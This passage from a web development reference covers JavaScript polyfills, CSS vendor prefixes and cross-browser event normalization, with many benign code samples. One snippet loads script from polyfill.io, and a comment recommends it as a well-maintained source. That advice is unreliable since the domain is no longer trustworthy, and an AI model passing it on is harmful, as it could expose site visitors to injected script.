    callback();
  } else {
    var script = document.createElement('script');
    script.src = url;
    script.onload = callback;
    document.head.appendChild(script);
  }
}

// Usage
loadPolyfill(
  'Promise' in window,
  'https://cdn.example.com/promise-polyfill.js',
  function() {
    // Continue app initialization
  }
);
```

#### Feature Detection Bundle

```javascript
var features = {
  promise: 'Promise' in window,
  fetch: 'fetch' in window,
  assign: typeof Object.assign === 'function',
  includes: Array.prototype.includes !== undefined,
  classList: 'classList' in document.createElement('div')
};

var polyfillsNeeded = [];
if (!features.promise) polyfillsNeeded.push('promise');
if (!features.fetch) polyfillsNeeded.push('fetch');
if (!features.assign) polyfillsNeeded.push('object-assign');

if (polyfillsNeeded.length > 0) {
  loadPolyfills(polyfillsNeeded, function() {
    initApp();
  });
} else {
  initApp();
}
```

#### Polyfill Service Pattern

```javascript
// Dynamic polyfill loading based on UA
(function() {
  var polyfillUrl = 'https://polyfill.io/v3/polyfill.min.js?features=';
  var features = [];
  
  if (!window.Promise) features.push('Promise');
  if (!window.fetch) features.push('fetch');
  if (!Array.from) features.push('Array.from');
  if (!Object.assign) features.push('Object.assign');
  
  if (features.length > 0) {
    var script = document.createElement('script');
    script.src = polyfillUrl + features.join(',');
    script.async = false;
    document.head.appendChild(script);
  }
})();
```

### Polyfill Best Practices

#### Spec Compliance

Polyfills should match specification behavior exactly, including edge cases:

```javascript
// Incorrect - doesn't handle negative indices
Array.prototype.at = function(index) {
  return this[index];
};

// Correct - handles negative indices per spec
if (!Array.prototype.at) {
  Array.prototype.at = function(index) {
    var n = parseInt(index) || 0;
    if (n < 0) n += this.length;
    if (n < 0 || n >= this.length) return undefined;
    return this[n];
  };
}
```

#### Performance Considerations

Polyfills can be slower than native implementations:

```javascript
// Native forEach is typically 5-10x faster than polyfilled version
// Consider performance impact for tight loops

// Bad for performance-critical code
if (!Array.prototype.forEach) {
  Array.prototype.forEach = function(callback, thisArg) {
    // Implementation...
  };
}

// Better: detect and use native when available
var forEach = Array.prototype.forEach || function(callback, thisArg) {
  // Polyfill implementation
};
```

#### Avoiding Prototype Pollution

```javascript
// Bad - pollutes global namespace
Array.prototype.customMethod = function() { /* ... */ };

// Better - only polyfill standard APIs
if (!Array.prototype.includes) {
  // Standard polyfill
}

// For custom methods, use utilities instead
var arrayUtils = {
  customMethod: function(arr) { /* ... */ }
};
```

### Testing Polyfills

#### Cross-Browser Testing

```javascript
// Test suite for polyfill validation
function testArrayIncludes() {
  var arr = [1, 2, 3, NaN, undefined];
  
  console.assert(arr.includes(1) === true, 'Should find existing element');
  console.assert(arr.includes(4) === false, 'Should not find missing element');
  console.assert(arr.includes(NaN) === true, 'Should find NaN');
  console.assert(arr.includes(undefined) === true, 'Should find undefined');
  console.assert(arr.includes(2, 2) === false, 'Should respect fromIndex');
  console.assert(arr.includes(2, -3) === true, 'Should handle negative fromIndex');
}
```

#### Regression Testing

```javascript
// Store reference to native implementation if exists
var nativeIncludes = Array.prototype.includes;

// After polyfill loads, compare behaviors
function validatePolyfill() {
  if (nativeIncludes) {
    var testCases = [
      [[1, 2, 3], [2]],
      [[1, 2, 3], [4]],
      [[NaN], [NaN]],
      [[1, 2, 3], [2, 2]]
    ];
    
    testCases.forEach(function(test) {
      var arr = test[0];
      var args = test[1];
      var nativeResult = nativeIncludes.apply(arr, args);
      var polyfillResult = Array.prototype.includes.apply(arr, args);
      
      if (nativeResult !== polyfillResult) {
        console.error('Polyfill behavior differs from native', test);
      }
    });
  }
}
```

### Transpilation vs Polyfilling

Transpilers (Babel) handle syntax, polyfills handle APIs:

```javascript
// Syntax - requires transpilation
const arrow = () => {};
class MyClass {}
const { a, b } = obj;

// APIs - require polyfills
Promise.resolve();
Array.from();
Object.assign();
```

Babel with `@babel/preset-env` and `useBuiltIns: 'usage'`:

```javascript
// Automatically includes only needed polyfills based on target browsers
// Input:
const p = Promise.resolve();
const arr = Array.from([1, 2, 3]);

// Output (with polyfills injected):
import "core-js/modules/es.promise";
import "core-js/modules/es.array.from";

var p = Promise.resolve();
var arr = Array.from([1, 2, 3]);
```

### Core-js Integration

Core-js provides comprehensive polyfills:

```javascript
// Import all polyfills
import 'core-js';

// Import specific features
import 'core-js/features/promise';
import 'core-js/features/array/from';
import 'core-js/features/object/assign';

// Import stable features only
import 'core-js/stable';

// Import by proposal stage
import 'core-js/stage/4';
```

### Polyfill Gotchas

#### Impossible to Polyfill Perfectly

Some features cannot be fully polyfilled:

```javascript
// Proxy — no polyfill possible
// WeakMap / WeakSet — limited polyfills (risk of memory leaks)
// Private fields (#field) — syntax-level feature
// Async / await — requires transpilation

// Proxies require native support
if (typeof Proxy === 'undefined') {
    // Cannot create true proxy behavior
    // Best effort: limited traps only
}
````

#### Performance Traps

```javascript
// Object.observe (deprecated) - used polling
// MutationObserver polyfill - uses polling (slow)
// Intersection Observer polyfill - uses polling

// These polyfills have significant performance costs
// [Inference] - Native implementations use browser internals
// for better performance than JavaScript polling can achieve
````

#### Spec Evolution

```javascript
// Early polyfills may differ from final spec
// Example: Promise.prototype.finally changed during standardization

// Always use well-maintained polyfills from:
// - core-js
// - MDN polyfills
// - polyfill.io
// - Official proposals (when stable)
```

---

## Vendor Prefixes

Vendor prefixes are special prefixes added to CSS properties and values that allow browser vendors to implement experimental, non-standard, or in-development features before they become part of the official CSS specification. These prefixes prevent conflicts between experimental implementations and finalized standards.

### Standard Prefix Notation

Each major browser engine uses a distinct prefix:

- `-webkit-` — WebKit/Blink engines (Safari, Chrome, Edge, Opera, mobile browsers)
- `-moz-` — Gecko engine (Firefox)
- `-ms-` — Trident/EdgeHTML engines (Internet Explorer, legacy Edge)
- `-o-` — Presto engine (legacy Opera, pre-version 15)

### Syntax Patterns

Vendor prefixes apply to both properties and values:

```css
/* Prefixed property */
.element {
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  transform: rotate(45deg);
}

/* Prefixed value */
.element {
  display: -webkit-box;
  display: -moz-box;
  display: -ms-flexbox;
  display: flex;
}

/* Prefixed pseudo-elements */
input::-webkit-input-placeholder { }
input::-moz-placeholder { }
input:-ms-input-placeholder { }
input::placeholder { }
```

The unprefixed standard version should always appear last to ensure it takes precedence when supported.

### Historical Context and Current Usage

Vendor prefixes emerged in the mid-2000s as CSS3 development accelerated. Browser vendors needed mechanisms to test features in production environments without committing to potentially unstable specifications.

Common properties that historically required prefixes include:

- Transform properties (`transform`, `transform-origin`)
- Transition and animation properties
- Flexbox (`display: flex`, `flex-direction`, etc.)
- Grid layout (early implementations)
- Border radius (very early implementations)
- Box shadow and text shadow
- Gradient functions
- User selection controls
- Appearance modifications

### Modern Decline in Necessity

Most modern CSS features no longer require vendor prefixes. The CSS Working Group and browser vendors have shifted toward:

1. **Feature flags** — Experimental features hidden behind browser configuration flags
2. **Rapid standardization** — Faster specification finalization processes
3. **Coordinated releases** — Multi-browser consensus before shipping features
4. **Evergreen browsers** — Automatic updates reducing fragmentation

Properties like `border-radius`, `box-shadow`, `transform`, and `transition` no longer need prefixes in any current browser version.

### Properties Still Requiring Prefixes

[Inference based on recent browser behavior patterns] A limited set of properties may still benefit from prefixes in certain contexts:

**WebKit-specific:**

- `-webkit-background-clip: text` — Text clipping for gradient text effects
- `-webkit-text-fill-color` — Text fill color control
- `-webkit-line-clamp` — Multi-line text truncation
- `-webkit-mask-*` properties — Masking effects
- `-webkit-appearance` — Form control styling (though `appearance` is increasingly supported)

**Scrollbar styling:**

- `::-webkit-scrollbar` and related pseudo-elements (WebKit/Blink only)
- `-ms-overflow-style` (legacy IE/Edge)
- `scrollbar-width`, `scrollbar-color` (Firefox, standardizing)

### Autoprefixer and Build Tools

Manual vendor prefix management is error-prone and maintenance-intensive. Autoprefixer, a PostCSS plugin, automates prefix addition based on browser support targets:

```javascript
// postcss.config.js
module.exports = {
  plugins: [
    require('autoprefixer')({
      overrideBrowserslist: ['last 2 versions', '> 1%']
    })
  ]
}
```

Autoprefixer uses data from Can I Use (caniuse.com) to determine which properties need prefixes for specified browser versions. This approach:

- Eliminates manual prefix tracking
- Reduces CSS bloat by excluding unnecessary prefixes
- Updates automatically as browser support changes
- Integrates with build pipelines (Webpack, Gulp, Parcel, Vite)

### Browser Support Detection

Feature detection libraries like Modernizr can identify prefix requirements at runtime:

```javascript
// Check for prefixed property support
function getSupportedProperty(property) {
  const prefixes = ['webkit', 'moz', 'ms', 'o'];
  const style = document.createElement('div').style;
  
  if (property in style) return property;
  
  const capitalized = property.charAt(0).toUpperCase() + property.slice(1);
  for (let prefix of prefixes) {
    const prefixedProp = prefix + capitalized;
    if (prefixedProp in style) return prefixedProp;
  }
  
  return null;
}
```

### @supports Rule

The `@supports` CSS at-rule provides native feature detection without JavaScript:

```css
@supports (display: grid) {
  .container { display: grid; }
}

@supports ((-webkit-backdrop-filter: blur(10px)) or (backdrop-filter: blur(10px))) {
  .modal {
    -webkit-backdrop-filter: blur(10px);
    backdrop-filter: blur(10px);
  }
}
```

This approach enables progressive enhancement directly in CSS, applying styles only when the browser supports specific properties.

### Best Practices

**Ordering convention:** Place vendor-prefixed properties before the standard property:

```css
.element {
  -webkit-transition: all 0.3s;
  -moz-transition: all 0.3s;
  transition: all 0.3s;
}
```

This ensures the standard version overrides prefixed versions when supported.

**Avoid overuse:** Don't prefix properties that never required prefixes or where support is universal in target browsers. Excessive prefixing increases file size and maintenance burden.

**Audit regularly:** Review and remove obsolete prefixes as browser support evolves. Tools like `postcss-preset-env` can automatically remove unnecessary prefixes.

**Test across browsers:** Prefixed implementations may have subtle behavioral differences. Verify functionality in actual target browsers, not just emulators.

### Vendor-Specific Extensions

Some prefixed properties represent vendor-specific extensions unlikely to standardize:

- `-webkit-tap-highlight-color` — Mobile tap highlight color (WebKit)
- `-moz-user-focus` — Focus control (Firefox)
- `-webkit-touch-callout` — iOS long-press menu control

These should be used cautiously, with fallbacks for non-supporting browsers.

### JavaScript API Prefixes

Vendor prefixes also appear in JavaScript APIs:

```javascript
const requestAnimationFrame = 
  window.requestAnimationFrame ||
  window.webkitRequestAnimationFrame ||
  window.mozRequestAnimationFrame ||
  window.msRequestAnimationFrame;

const AudioContext = 
  window.AudioContext || 
  window.webkitAudioContext;
```

Polyfills and normalization libraries typically handle these differences transparently.

### Performance Considerations

Multiple vendor-prefixed properties increase CSS file size. For high-traffic sites:

1. Use Autoprefixer with precise browser targets to minimize unnecessary prefixes
2. Enable CSS minification to remove comments and whitespace
3. Consider serving different stylesheets to different browser families (advanced optimization)
4. Monitor actual browser usage to adjust prefix strategy

### Future Trajectory

The industry trend is toward eliminating vendor prefixes entirely. The CSS Working Group discourages new prefixed features. [Inference] Developers working on modern projects targeting current browsers can largely ignore vendor prefixes, relying on build tools to handle the remaining edge cases.

---

## Cross-Browser Event Handling

### Event Model Differences

#### DOM Level 0 vs DOM Level 2 Event Models

**DOM Level 0** uses inline event handlers and direct property assignment (`element.onclick = handler`). This approach supports only one handler per event type and provides limited control over event propagation.

**DOM Level 2** introduces `addEventListener()` and `removeEventListener()`, allowing multiple handlers per event, explicit phase control (capture vs bubble), and standardized event object properties.

#### Internet Explorer's Legacy Model

Internet Explorer 8 and earlier used `attachEvent()` and `detachEvent()` instead of the standard methods. Key differences include:

- Method naming: `attachEvent('onclick', handler)` vs `addEventListener('click', handler)`
- Event name prefix: IE required "on" prefix
- Execution context: `this` referred to `window` instead of the element
- Event object: Accessed via `window.event` rather than as a parameter
- No capture phase support

### Event Registration Patterns

#### Cross-Browser Event Listener Attachment

```javascript
function addEvent(element, eventType, handler) {
  if (element.addEventListener) {
    element.addEventListener(eventType, handler, false);
  } else if (element.attachEvent) {
    element.attachEvent('on' + eventType, function() {
      handler.call(element, window.event);
    });
  } else {
    element['on' + eventType] = handler;
  }
}
```

The wrapper function corrects IE's execution context issue by using `call()` to bind `this` to the target element.

#### Event Removal Considerations

Removing events requires storing references to the exact handler function. Anonymous functions cannot be removed. For IE's `attachEvent`, the wrapper function must be stored:

```javascript
function EventManager() {
  this.handlers = new WeakMap();
}

EventManager.prototype.add = function(element, eventType, handler) {
  if (element.addEventListener) {
    element.addEventListener(eventType, handler, false);
    // Store for removal
  } else if (element.attachEvent) {
    var wrapper = function() {
      handler.call(element, window.event);
    };
    element.attachEvent('on' + eventType, wrapper);
    // Store wrapper for removal
    if (!this.handlers.has(element)) {
      this.handlers.set(element, {});
    }
    this.handlers.get(element)[eventType + handler] = wrapper;
  }
};
```

### Event Object Normalization

#### Property Access Differences

Standard event objects provide properties directly, while IE's `window.event` uses different property names:

- Target element: `event.target` (standard) vs `event.srcElement` (IE)
- Related target (mouseover/out): `event.relatedTarget` vs `event.fromElement`/`event.toElement`
- Mouse button: `event.button` values differ (0/1/2 standard vs 1/4/2 IE)
- Key codes: `event.which` vs `event.keyCode`
- Page coordinates: `event.pageX/pageY` not available in IE (requires calculation)

#### Event Object Wrapper

```javascript
function normalizeEvent(event) {
  event = event || window.event;
  
  if (!event.target) {
    event.target = event.srcElement || document;
  }
  
  if (!event.preventDefault) {
    event.preventDefault = function() {
      event.returnValue = false;
    };
  }
  
  if (!event.stopPropagation) {
    event.stopPropagation = function() {
      event.cancelBubble = true;
    };
  }
  
  if (event.pageX == null && event.clientX != null) {
    var doc = document.documentElement;
    var body = document.body;
    event.pageX = event.clientX + 
      (doc && doc.scrollLeft || body && body.scrollLeft || 0) -
      (doc && doc.clientLeft || body && body.clientLeft || 0);
    event.pageY = event.clientY + 
      (doc && doc.scrollTop || body && body.scrollTop || 0) -
      (doc && doc.clientTop || body && body.clientTop || 0);
  }
  
  if (!event.which && event.button !== undefined) {
    // Convert IE button values to W3C values
    event.which = (event.button & 1 ? 1 : 
                   (event.button & 2 ? 3 : 
                   (event.button & 4 ? 2 : 0)));
  }
  
  return event;
}
```

### Event Propagation Control

#### Capture and Bubble Phase Handling

Modern browsers support both capture (top-down) and bubble (bottom-up) phases. The third parameter in `addEventListener()` controls phase participation:

```javascript
element.addEventListener('click', handler, true);  // capture phase
element.addEventListener('click', handler, false); // bubble phase
```

IE's `attachEvent` only supports bubbling. To simulate capture behavior in cross-browser code, handlers must be attached to parent elements and filter events based on `target` inspection.

#### Stopping Propagation

```javascript
function stopPropagation(event) {
  if (event.stopPropagation) {
    event.stopPropagation();
  } else {
    event.cancelBubble = true;
  }
}

function stopImmediatePropagation(event) {
  if (event.stopImmediatePropagation) {
    event.stopImmediatePropagation();
  } else {
    event.cancelBubble = true;
    // [Inference: IE doesn't have true immediate propagation stop]
    event.isImmediatePropagationStopped = true;
  }
}
```

`stopImmediatePropagation()` prevents other handlers on the same element from executing, while `stopPropagation()` only prevents propagation to ancestors.

#### Preventing Default Actions

```javascript
function preventDefault(event) {
  if (event.preventDefault) {
    event.preventDefault();
  } else {
    event.returnValue = false;
  }
}
```

Return values also affect default behavior: returning `false` from a DOM Level 0 handler prevents default action, but this doesn't work reliably with `addEventListener`. Explicit `preventDefault()` calls are preferred.

### Event Delegation Strategies

#### Target Element Resolution

Event delegation attaches handlers to ancestor elements and uses the event target to determine which descendant triggered the event:

```javascript
document.getElementById('list').addEventListener('click', function(event) {
  event = normalizeEvent(event);
  var target = event.target;
  
  // Walk up to find actual clickable element
  while (target && target !== this) {
    if (target.nodeName === 'LI') {
      handleListItemClick(target);
      break;
    }
    target = target.parentNode;
  }
});
```

#### Text Node Handling

In some browsers, clicking on text returns the text node as `event.target` rather than the element. The `nodeType` check handles this:

```javascript
var target = event.target;
if (target.nodeType === 3) { // TEXT_NODE
  target = target.parentNode;
}
```

#### Selector Matching for Delegation

Modern delegation libraries match targets against CSS selectors:

```javascript
function matches(element, selector) {
  var matches = element.matches ||
                element.matchesSelector ||
                element.msMatchesSelector ||
                element.mozMatchesSelector ||
                element.webkitMatchesSelector ||
                element.oMatchesSelector;
  
  if (matches) {
    return matches.call(element, selector);
  }
  
  // Fallback [Inference: uses querySelectorAll for matching]
  var parent = element.parentNode;
  var nodes = parent.querySelectorAll(selector);
  for (var i = 0; i < nodes.length; i++) {
    if (nodes[i] === element) return true;
  }
  return false;
}
```

### Mouse Event Peculiarities

#### Button Value Translation

Mouse button values differ significantly across browsers:

|Button|W3C Standard|IE 8-|Middle Button Complications|
|---|---|---|---|
|Left|0|1|Safari 2 reported as 1|
|Middle|1|4|Not supported in IE <9|
|Right|2|2|Context menu interference|

Complete normalization:

```javascript
function getButton(event) {
  if (event.which != null) {
    return event.which;
  }
  
  // IE button bitmask
  var button = event.button;
  if (button !== undefined) {
    return (button & 1 ? 1 : (button & 2 ? 3 : (button & 4 ? 2 : 0)));
  }
  
  return 0;
}
```

#### Mouse Position Coordinates

Different coordinate systems exist:

- `clientX/Y`: relative to viewport
- `pageX/Y`: relative to document (including scroll)
- `screenX/Y`: relative to screen
- `offsetX/Y`: relative to target element (non-standard)

`pageX/Y` requires calculation in older IE:

```javascript
function getPageCoordinates(event) {
  if (event.pageX != null) {
    return { x: event.pageX, y: event.pageY };
  }
  
  var doc = document.documentElement;
  var body = document.body;
  
  return {
    x: event.clientX + (doc.scrollLeft || body.scrollLeft || 0) - 
       (doc.clientLeft || body.clientLeft || 0),
    y: event.clientY + (doc.scrollTop || body.scrollTop || 0) - 
       (doc.clientTop || body.clientTop || 0)
  };
}
```

#### MouseEnter/MouseLeave vs MouseOver/MouseOut

`mouseenter` and `mouseleave` don't bubble, while `mouseover` and `mouseout` do. This affects delegation strategies:

```javascript
// mouseover bubbles, so checking relatedTarget is necessary
element.addEventListener('mouseover', function(event) {
  var target = event.target;
  var relatedTarget = event.relatedTarget;
  
  // Only trigger if coming from outside this element
  if (!relatedTarget || !target.contains(relatedTarget)) {
    handleEnter(target);
  }
});
```

Some older browsers don't support `mouseenter/mouseleave`, requiring `mouseover/mouseout` with `relatedTarget` checks for cross-browser compatibility.

### Keyboard Event Handling

#### Key Code Standardization

Key identification differs between `keydown/keyup` and `keypress` events:

- `keydown/keyup`: `event.keyCode` represents physical key
- `keypress`: `event.keyCode` or `event.which` represents character code

```javascript
function getCharCode(event) {
  if (event.which != null) {
    return event.which;
  }
  return event.keyCode;
}

function getKeyCode(event) {
  return event.keyCode || event.which;
}
```

Character extraction from keypress:

```javascript
function getChar(event) {
  var code = getCharCode(event);
  if (code < 32) return null; // Control character
  return String.fromCharCode(code);
}
```

#### Modifier Key Detection

Modifier keys (`Ctrl`, `Alt`, `Shift`, `Meta`) use boolean properties:

```javascript
function getModifiers(event) {
  return {
    ctrl: event.ctrlKey,
    alt: event.altKey,
    shift: event.shiftKey,
    meta: event.metaKey // Command on Mac, Windows key on PC
  };
}
```

Cross-platform Ctrl/Command handling:

```javascript
function isPlatformCtrlKey(event) {
  // Mac uses Cmd, others use Ctrl
  var isMac = /Mac|iPod|iPhone|iPad/.test(navigator.platform);
  return isMac ? event.metaKey : event.ctrlKey;
}
```

#### KeyboardEvent.key vs keyCode

Modern browsers support `event.key` which provides readable key names ('Enter', 'ArrowUp', 'a') instead of numeric codes. Fallback required:

```javascript
function getKeyIdentifier(event) {
  // Modern standard
  if (event.key) {
    return event.key;
  }
  
  // Older WebKit
  if (event.keyIdentifier) {
    return event.keyIdentifier;
  }
  
  // Fallback to keyCode [Inference: requires manual mapping]
  var keyMap = {
    13: 'Enter',
    27: 'Escape',
    37: 'ArrowLeft',
    38: 'ArrowUp',
    39: 'ArrowRight',
    40: 'ArrowDown'
    // ... extensive mapping required
  };
  
  return keyMap[event.keyCode] || String.fromCharCode(event.keyCode);
}
```

### Touch and Pointer Events

#### Touch Event Normalization

Touch events (`touchstart`, `touchmove`, `touchend`) aren't supported in desktop browsers and older mobile browsers. Mouse events serve as fallback:

```javascript
var touchEvents = {
  start: 'touchstart',
  move: 'touchmove',
  end: 'touchend'
};

var mouseEvents = {
  start: 'mousedown',
  move: 'mousemove',
  end: 'mouseup'
};

var isTouch = 'ontouchstart' in window;
var events = isTouch ? touchEvents : mouseEvents;

element.addEventListener(events.start, handleStart);
```

Touch coordinates come from `touches`, `targetTouches`, or `changedTouches` arrays:

```javascript
function getEventCoordinates(event) {
  if (event.touches && event.touches.length) {
    return {
      x: event.touches[0].pageX,
      y: event.touches[0].pageY
    };
  }
  
  if (event.changedTouches && event.changedTouches.length) {
    return {
      x: event.changedTouches[0].pageX,
      y: event.changedTouches[0].pageY
    };
  }
  
  return getPageCoordinates(event); // Mouse event fallback
}
```

#### Pointer Events Unification

Pointer Events API unifies mouse, touch, and pen input:

```javascript
function supportsPointerEvents() {
  return window.PointerEvent !== undefined;
}

function addUnifiedPointerHandler(element, handler) {
  if (supportsPointerEvents()) {
    element.addEventListener('pointerdown', handler);
  } else if (window.TouchEvent) {
    element.addEventListener('touchstart', handler);
  } else {
    element.addEventListener('mousedown', handler);
  }
}
```

Pointer event properties include `pointerType` ('mouse', 'touch', 'pen') and pressure sensitivity.

#### Touch Action and Scroll Prevention

Preventing default touch behavior:

```javascript
element.addEventListener('touchstart', function(event) {
  event.preventDefault(); // Prevents scrolling, zooming
  handleTouch(event);
}, { passive: false }); // passive: false required for preventDefault
```

CSS `touch-action` property provides declarative control:

```css
.draggable {
  touch-action: none; /* Disable browser handling */
}
```

Passive event listeners improve scroll performance but disable `preventDefault()`:

```javascript
element.addEventListener('touchmove', handler, { passive: true });
// event.preventDefault() will be ignored
```

### Form Event Differences

#### Input, Change, and Property Change

`input` event fires on each value change (typing, pasting), while `change` fires on blur or commit. IE 8 doesn't support `input`:

```javascript
function addInputHandler(element, handler) {
  if ('oninput' in element) {
    element.addEventListener('input', handler);
  } else {
    // IE 8 fallback
    element.attachEvent('onpropertychange', function(event) {
      if (event.propertyName === 'value') {
        handler.call(element, event);
      }
    });
  }
}
```

#### Submit Event and Form Validation

Submit event handling varies in when validation occurs:

```javascript
form.addEventListener('submit', function(event) {
  event = normalizeEvent(event);
  
  if (!validateForm(this)) {
    event.preventDefault();
    return false; // Additional safety for older browsers
  }
});
```

`checkValidity()` and HTML5 validation aren't universally supported:

```javascript
function isValidForm(form) {
  if (form.checkValidity) {
    return form.checkValidity();
  }
  
  // Manual validation fallback [Inference: requires custom validation logic]
  return customValidation(form);
}
```

### Focus and Blur Events

#### Focus Event Bubbling

`focus` and `blur` don't bubble in most browsers, but `focusin` and `focusout` do:

```javascript
function addFocusHandler(element, handler, useCapture) {
  if (element.addEventListener) {
    if (useCapture) {
      // Use capture phase for delegation with focus/blur
      element.addEventListener('focus', handler, true);
    } else if ('onfocusin' in element) {
      // IE and modern browsers support focusin (bubbles)
      element.addEventListener('focusin', handler, false);
    } else {
      element.addEventListener('focus', handler, false);
    }
  }
}
```

#### Active Element Tracking

`document.activeElement` provides currently focused element, but IE 8 has quirks:

```javascript
function getActiveElement() {
  try {
    return document.activeElement;
  } catch (e) {
    // IE can throw if activeElement is removed from DOM
    return document.body;
  }
}
```

### Custom Events

#### Creating and Dispatching

Modern browsers use `CustomEvent` constructor:

```javascript
var event = new CustomEvent('myevent', {
  detail: { data: 'payload' },
  bubbles: true,
  cancelable: true
});

element.dispatchEvent(event);
```

IE 9-11 requires `createEvent`:

```javascript
function createCustomEvent(type, detail, bubbles, cancelable) {
  var event;
  
  if (typeof CustomEvent === 'function') {
    event = new CustomEvent(type, {
      detail: detail,
      bubbles: bubbles,
      cancelable: cancelable
    });
  } else {
    event = document.createEvent('CustomEvent');
    event.initCustomEvent(type, bubbles, cancelable, detail);
  }
  
  return event;
}

function dispatchEvent(element, event) {
  if (element.dispatchEvent) {
    element.dispatchEvent(event);
  } else if (element.fireEvent) {
    element.fireEvent('on' + event.type, event);
  }
}
```

#### Event Data Transfer

Custom data passes through `detail` property:

```javascript
element.addEventListener('myevent', function(event) {
  var data = event.detail;
  console.log(data.message);
});

var evt = createCustomEvent('myevent', { message: 'Hello' }, true, true);
dispatchEvent(element, evt);
```

### Memory Leak Prevention

#### Circular Reference Cleanup

IE 8 and earlier had memory leaks when DOM elements and JavaScript objects held circular references through event handlers:

```javascript
function leakyAttach(element) {
  // BAD: Creates circular reference in old IE
  element.onclick = function() {
    doSomething(element); // Handler references element
  };
}
```

Solutions include removing handlers before page unload:

```javascript
window.addEventListener('unload', function() {
  // Remove all event handlers
  var elements = document.getElementsByTagName('*');
  for (var i = 0; i < elements.length; i++) {
    var element = elements[i];
    for (var prop in element) {
      if (prop.indexOf('on') === 0 && typeof element[prop] === 'function') {
        element[prop] = null;
      }
    }
  }
});
```

Modern browsers with garbage collection improvements don't require this, but libraries still implement cleanup for broad compatibility.

#### Handler Reference Management

WeakMaps store handler references without preventing garbage collection:

```javascript
var handlerRegistry = new WeakMap();

function addEventWithCleanup(element, type, handler) {
  var cleanupHandler = function(event) {
    handler.call(element, normalizeEvent(event));
  };
  
  if (!handlerRegistry.has(element)) {
    handlerRegistry.set(element, {});
  }
  
  var handlers = handlerRegistry.get(element);
  handlers[type] = handlers[type] || [];
  handlers[type].push({ original: handler, wrapped: cleanupHandler });
  
  addEvent(element, type, cleanupHandler);
}
```

### Feature Detection Patterns

#### Capability Testing

Test for feature existence rather than browser detection:

```javascript
var eventSupport = {
  addEventListener: !!window.addEventListener,
  attachEvent: !!window.attachEvent,
  customEvent: typeof CustomEvent === 'function',
  pointerEvents: window.PointerEvent !== undefined,
  touchEvents: 'ontouchstart' in window,
  inputEvent: 'oninput' in document.createElement('input'),
  focusinEvent: 'onfocusin' in window,
  passiveEvents: (function() {
    var passive = false;
    try {
      var opts = Object.defineProperty({}, 'passive', {
        get: function() { passive = true; }
      });
      window.addEventListener('test', null, opts);
    } catch (e) {}
    return passive;
  })()
};
```

#### Event Support Testing

Test if specific events are supported:

```javascript
function isEventSupported(eventName, element) {
  element = element || document.createElement('div');
  var eventAttribute = 'on' + eventName;
  var isSupported = (eventAttribute in element);
  
  if (!isSupported) {
    element.setAttribute(eventAttribute, 'return;');
    isSupported = typeof element[eventAttribute] === 'function';
  }
  
  return isSupported;
}
```

### Event Performance Optimization

#### Throttling and Debouncing

High-frequency events (scroll, resize, mousemove) benefit from rate limiting:

```javascript
function throttle(func, limit) {
  var inThrottle;
  return function() {
    var args = arguments;
    var context = this;
    if (!inThrottle) {
      func.apply(context, args);
      inThrottle = true;
      setTimeout(function() { inThrottle = false; }, limit);
    }
  };
}

function debounce(func, wait) {
  var timeout;
  return function() {
    var context = this;
    var args = arguments;
    clearTimeout(timeout);
    timeout = setTimeout(function() {
      func.apply(context, args);
    }, wait);
  };
}

window.addEventListener('scroll', throttle(function(event) {
  // Executes at most once per 100ms
}, 100));

window.addEventListener('resize', debounce(function(event) {
  // Executes once after resize stops for 250ms
}, 250));
```

#### Passive Event Listeners

Passive listeners improve scroll performance by declaring handlers won't call `preventDefault()`:

```javascript
function addPassiveEventListener(element, type, handler) {
  if (eventSupport.passiveEvents) {
    element.addEventListener(type, handler, { passive: true });
  } else {
    element.addEventListener(type, handler, false);
  }
}

addPassiveEventListener(window, 'scroll', handleScroll);
```

#### Event Delegation Performance

Delegating to fewer ancestors reduces handler count:

```javascript
// INEFFICIENT: 1000 handlers
var items = document.querySelectorAll('.item');
for (var i = 0; i < items.length; i++) {
  items[i].addEventListener('click', handleClick);
}

// EFFICIENT: 1 handler
document.getElementById('container').addEventListener('click', function(event) {
  var target = event.target;
  while (target && target !== this) {
    if (target.classList.contains('item')) {
      handleClick.call(target, event);
      break;
    }
    target = target.parentNode;
  }
});
```

### Browser-Specific Workarounds

#### Safari's Click Event Peculiarities

Safari doesn't fire click events on non-interactive elements by default:

```css
/* Make divs clickable in Safari */
.clickable {
  cursor: pointer;
}
```

Or use JavaScript:

```javascript
function makeClickable(element) {
  if (/Safari/.test(navigator.userAgent) && 
      !/Chrome/.test(navigator.userAgent)) {
    element.style.cursor = 'pointer';
  }
}
```

#### Firefox's MouseEvent.which Inconsistency

[Inference: Some Firefox versions had inconsistent `which` values for mouse buttons in certain contexts]

```javascript
function getMouseButton(event) {
  // Normalize across all browsers
  if (event.which != null) {
    return event.which;
  }
  if (event.button != null) {
    // IE button to standard conversion
    var button = event.button;
    return button & 1 ? 1 : (button & 2 ? 3 : (button & 4 ? 2 : 0));
  }
  return 0;
}
```

#### Mobile Safari's Touch Delay

300ms tap delay on mobile Safari for double-tap zoom detection:

```javascript
function removeTapDelay() {
  if ('ontouchstart' in window) {
    // Modern approach: touch-action CSS
    document.documentElement.style.touchAction = 'manipulation';
    
    // Fallback: FastClick pattern
    var lastTouchTime = 0;
    document.addEventListener('touchstart', function(event) {
      var now = Date.now();
      if (now - lastTouchTime < 500) {
        event.preventDefault();
      }
      lastTouchTime = now;
    }, true);
  }
}
```

### Event Polyfills and Shims

#### Polyfilling addEventListener

Complete cross-browser event system:

```javascript
(function() {
  if (!window.addEventListener) {
    (function() {
      window.addEventListener = function(type, listener) {
        window.attachEvent('on' + type, function() {
          listener.call(window, window.event);
        });
      };
      
      Element.prototype.addEventListener = function(type, listener) {
        var self = this;
        this.attachEvent('on' + type, function(event) {
          listener.call(self, event);
        });
      };
    })();
  }
  
  if (!Event.prototype.preventDefault) {
    Event.prototype.preventDefault = function() {
      this.returnValue = false;
    };
  }
  
  if (!Event.prototype.stopPropagation) {
    Event.prototype.stopPropagation = function() {
      this.cancelBubble = true;
    };
  }
})();
```

#### CustomEvent Polyfill

```javascript
(function() {
  if (typeof window.CustomEvent === 'function') return;
  
  function CustomEvent(event, params) {
    params = params || { bubbles: false, cancelable: false, detail: null };
    var evt = document.createEvent('CustomEvent');
    evt.initCustomEvent(event, params.bubbles, params.cancelable, params.detail);
    return evt;
  }
  
  CustomEvent.prototype = window.Event.prototype;
  window.CustomEvent = CustomEvent;
})();
```

### Testing Event Handlers

#### Triggering Synthetic Events

Programmatically fire events for testing:

```javascript
function triggerEvent(element, eventType, options) {
  options = options || {};
  var event;
  
  if (document.createEvent) {
